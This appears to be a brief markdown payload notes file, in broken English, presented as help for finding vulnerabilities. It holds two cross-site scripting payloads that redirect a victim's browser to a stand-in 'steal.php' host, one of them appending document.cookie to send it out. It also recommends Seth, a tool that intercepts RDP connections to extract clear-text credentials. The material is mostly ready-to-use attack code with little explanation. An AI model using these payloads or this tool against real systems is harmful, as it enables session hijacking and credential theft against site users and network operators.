# payload

### Payload is helping for identify Vulneraability into System/Application.

* XSS Script for grabe cookie:
```javascript
<script>document.location="http://steal.php"</script>
```

```javascript
<img src=a onerror=confirm(document.location="http://steal.php?cookie=" + document.cookie;)>
```

* Seth
Seth is a tool written in Python and Bash to MitM RDP connections by attempting to downgrade the connection in order to extract clear text credentials.
https://github.com/SySS-Research/Seth
